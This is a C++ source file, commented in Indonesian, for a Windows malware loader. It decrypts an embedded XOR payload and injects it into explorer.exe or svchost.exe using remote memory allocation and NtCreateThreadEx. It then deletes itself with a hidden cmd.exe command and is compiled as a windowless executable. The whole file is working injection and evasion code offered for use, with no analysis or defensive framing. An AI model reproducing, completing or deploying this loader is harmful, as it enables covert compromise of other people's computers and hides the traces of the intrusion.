// loader_final.cpp
// Compile: x86_64-w64-mingw32-g++ -O2 -mwindows -no-pie -static-libgcc -static-libstdc++ loader_final.cpp -o loader.exe -lwininet -lws2_32

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <string>
#include <tlhelp32.h>
#include <cstdio>
#include <ctime>

#include "payload.h"   // unsigned char payload_bin[] dan unsigned int payload_bin_len

// ============================================================
// TIPE FUNGSI NtCreateThreadEx
// ============================================================
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID AttributeList
);

// ============================================================
// DECRYPT PAYLOAD (jika di-XOR)
// ============================================================
void DecryptPayload() {
    for (unsigned int i = 0; i < payload_bin_len; i++) {
        payload_bin[i] ^= 0x5B; // Ganti dengan key XOR-mu
    }
}

// ============================================================
// CARI PID EXPLORER.EXE
// ============================================================
DWORD FindProcessId(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(processName, pe.szExeFile) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// ============================================================
// INJECT PAYLOAD KE EXPLORER.EXE
// ============================================================
bool InjectPayload() {
    // 1. Cari explorer.exe
    DWORD pid = FindProcessId(L"explorer.exe");
    if (pid == 0) {
        pid = FindProcessId(L"svchost.exe"); // fallback
    }
    if (pid == 0) return false;

    // 2. Buka proses
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    // 3. Alokasi memory di target
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, payload_bin_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        CloseHandle(hProcess);
        return false;
    }

    // 4. Tulis payload
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, pRemote, payload_bin, payload_bin_len, &written)) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 5. Ubah proteksi ke PAGE_EXECUTE_READ
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemote, payload_bin_len, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 6. Dapatkan NtCreateThreadEx dari ntdll.dll (INDIRECT SYSCALL)
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 7. Buat thread di proses target
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)pRemote,
        NULL,
        0, 0, 0, 0, NULL
    );

    if (status == 0 && hThread) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    } else {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
}

// ============================================================
// SELF-DELETE
// ============================================================
void SelfDelete() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char cmd[512];
    sprintf_s(cmd, "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del \"%s\"", path);
    WinExec(cmd, SW_HIDE);
}

// ============================================================
// ENTRY POINT
// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Decrypt payload jika perlu
    // DecryptPayload();

    if (!InjectPayload()) {
        return 1;
    }

    SelfDelete();
    ExitProcess(0);
    return 0;
}
